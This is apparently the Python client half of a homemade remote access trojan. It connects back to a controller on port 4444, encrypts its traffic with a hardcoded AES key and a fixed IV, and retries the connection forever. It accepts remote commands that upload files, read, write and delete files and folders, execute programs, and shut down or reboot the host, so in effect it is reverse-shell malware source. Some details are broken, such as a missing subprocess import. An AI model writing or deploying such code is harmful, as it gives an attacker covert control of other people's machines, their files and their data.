import socket
from Crypto.Cipher import AES
import time
import os
import sys


#Padding so the text is always a multiplier of 16 bits
def customPadding(messageToPad):
    while(len(messageToPad)%16!=0):
        messageToPad+="~"
    return  messageToPad

def encryption(messageToEncrypt):
    try:
        messageToEncrypt=customPadding(messageToEncrypt)
        obj = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
        return obj.encrypt(messageToEncrypt)
    except:
        return "Something went wrong with the encryption"

def decryption(ciphertext):
    try:
        obj2 = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
        return (obj2.decrypt(ciphertext).decode()).replace("~","")
    except:
        return "Something went wrong with the decryption"

def sendingFile(filename,mySocket):
    if(os.path.isfile(filename)):
        f = open(filename,'rb')
        l = f.read(4096)
        while (l):
            mySocket.send(l)
            l = f.read(4096)
        f.close()
        mySocket.send("_EOD_".encode())
    else:
        mySocket.send("_EOD_".encode())

def getCurrentWorkingDirectory(mySocket):
    sending_message = os.getcwd()
    mySocket.send(encryption(sending_message))

def changeDirectory(mySocket,receiving_message):
    try:
        os.chdir(receiving_message[6:])
        sending_message = os.getcwd()
    #os.chdir() throws a FileNotFound error, we catch it here so our code can continue to run   
    except FileNotFoundError:
        sending_message = 'Error folder not found'
    finally:
        mySocket.send(encryption(sending_message))

def deleteFile(mySocket,receiving_message):
     try:
        os.remove(receiving_message[7:])
        sending_message = 'File deleted'
        #os.remove() throws a FileNotFound error, we catch it here so our code can continue to run   
     except FileNotFoundError:
        sending_message = 'Error file not found'
     finally:
        mySocket.send(encryption(sending_message))

def makeDirectories(mySocket,receiving_message):
    try:
        os.makedirs(receiving_message[9:])
        sending_message = str(os.getcwd()+receiving_message[8:])
    except:
        sending_message = 'Something went wrong maybe you need permission.'
    finally:
        mySocket.send(encryption(sending_message))

def removeDirectories(mySocket,receiving_message):
    try:
        os.removedirs(receiving_message[11:])
        sending_message = 'Directory  deleted.'
    except:
        sending_message = 'Something went wrong maybe you need permission.'
    finally:
        mySocket.send(encryption(sending_message))
        
def createFile(mySocket,receiving_message):
    try:
        file = os.open(receiving_message[7:],os.O_CREAT)
        os.close(file)
        sending_message = 'File created.'
    except:
        sending_message = 'Something went wrong sorry.'
    finally:
        mySocket.send(encryption(sending_message)) 

def readFile(mySocket,receiving_message):
    try:
        file = os.open(receiving_message[5:],os.O_RDWR)
        sending_message = os.read(file,4096)
        os.close(file)
    except:
        sending_message = ("Error something went wrong.").encode()
    finally:
        mySocket.send(sending_message)

       
def writeToFile(mySocket,filename):
    #Build a text message until close is send
    try:
        sending_message = encryption("Start your message.")
        mySocket.send(sending_message)
        receiving_message = decryption(mySocket.recv(4096))
        text = ""
        while receiving_message!="close" and receiving_message.find("\nclose")==-1 and not receiving_message.endswith("close"):
            text += receiving_message +"\n"
            mySocket.send(encryption(text))
            receiving_message = decryption(mySocket.recv(4096))
    #Open the file write the message and close() at the end
        else:
            file = os.open(filename[6:],os.O_RDWR)
            os.write(file,text.encode())
            os.close(file)
            mySocket.send(encryption("Message written successfully."))
            
    
    except:
        mySocket.send(encryption("Something went wrong."))
        os.close(file)


def shutdown(mySocket,receiving_message):
    try:
        
        if sys.platform == "win32":
            if receiving_message[9:] == "-r":
                os.system("shutdown -r")
                sending_message = "The computer will restart in 1 min."
            elif  receiving_message[9:] == "-s":
                os.system("shutdown -s")
                sending_message = "The computer will shutdown in 1 min."
            else:
                sending_message = "Wrong option use -r or -s"
        else:
            if receiving_message[9:] == "-r":
                os.system("reboot")
                sending_message = "The computer will restart."
            elif  receiving_message[9:] == "-s":
                os.system("shutdown")
                sending_message = "The computer will shutdown."
            else:
                sending_message = "Wrong option use -r or -s"
    except:
        sending_message = "Error something went wrong"
        mySocket.send(encryption(sending_message))
    
def listOfFilesAndFolders(mySocket):
    sending_message = os.listdir(os.getcwd())
    mySocket.send(encryption((str(sending_message))))


#check if the os is windows or linux and execute accordingly
#in linux you can run only python scripts while in windows you can run pretty much any program
def executeFile(mySocket,receiving_message):
    try:
        if sys.platform == "win32":
            os.startfile(receiving_message[8:])
            sending_message="Executed "
        else:
            output = subprocess.call(["python", receiving_message[8:]])
            if output == 0:
                sending_message = "File execute successfully."
            else:
                sending_message = "Could not execute."
    except:
        sending_message = "Error something went wrong"
    finally:
        mySocket.send(encryption(sending_message))





    

def client():
    #Creating the socket passing the ip and port as parameters and trying to connect
    mySocket = socket.socket()
    mySocket.connect(("127.0.0.1",4444))
    #external ip: urllib.request.urlopen('http://ident.me').read().decode('utf8')
    received_message = " "
    while(received_message!="quit"):
        received_message=decryption(mySocket.recv(4096))
        if(received_message[0:8]=="download"):
            sendingFile(received_message[9:],mySocket)
        elif received_message =='getcwd':
            getCurrentWorkingDirectory(mySocket)
        elif received_message[0:5] =='chdir':
            changeDirectory(mySocket,received_message)
        elif received_message == "listdir":
            listOfFilesAndFolders(mySocket)
        #You need to provide the whole path no made what is your current working directory
        elif received_message[0:10] == "removedirs":
            removeDirectories(mySocket,received_message)    
        elif received_message[0:6] =='remove':
            deleteFile(mySocket,received_message)
        #Making new directories note that the directory starts from your current working directory not from /home or C:
        elif received_message[0:8] == 'makedirs':
            makeDirectories(mySocket,received_message)
        elif received_message[0:6] == 'create':
            createFile(mySocket,received_message)
        elif received_message[0:7] == 'execute':
            executeFile(mySocket,received_message)
        elif received_message[0:4] == 'read':
            readFile(mySocket,received_message)
        elif received_message[0:5] == 'write':
            writeToFile(mySocket,received_message)
        elif received_message[0:8] == 'shutdown':
            shutdown(mySocket,received_message)
        else:
            sending_message = encryption(received_message)
            mySocket.send(sending_message)
             
    mySocket.close()

if __name__ == "__main__":
    #secret_key = os.urandom(BLOCK_SIZE) i generated once and i will use that always
    secret_key=b'b\x90\xf7\x1d\\KY\xc3\xd7\x13\xf1\x90\xba\xe4HS\xe3\xce\x1cd\x8f\xdf\xda\xc8u\xa9B\x85-&<\xb7'
    Initialization_vector = 'This is a testIV'#IV must be 16 bytes long 
    while True:
        try:
            client()
        except:
            time.sleep(100) # sleep for 100 seconds before retrying to connect
